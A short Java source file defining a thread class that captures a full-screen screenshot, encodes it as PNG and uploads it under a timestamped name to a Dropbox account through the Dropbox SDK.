import com.dropbox.core.DbxException;
import com.dropbox.core.v2.DbxClientV2;
import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Uploader extends Thread {
    private DbxClientV2 client;

    public Uploader(DbxClientV2 client) {
        this.client = client;
    }

    public void run() {
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
        Date now = new Date();
        String path = "/" + dateFormat.format(now) + ".png";
        BufferedImage screen = null;
        try {
            screen = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            ByteArrayOutputStream os = new ByteArrayOutputStream();
            ImageIO.write(screen, "png", os);
            InputStream is = new ByteArrayInputStream(os.toByteArray());
            client.files().uploadBuilder(path).uploadAndFinish(is);
        }
        catch (IOException | DbxException | AWTException ex) {
            ex.printStackTrace();
        }
    }
}
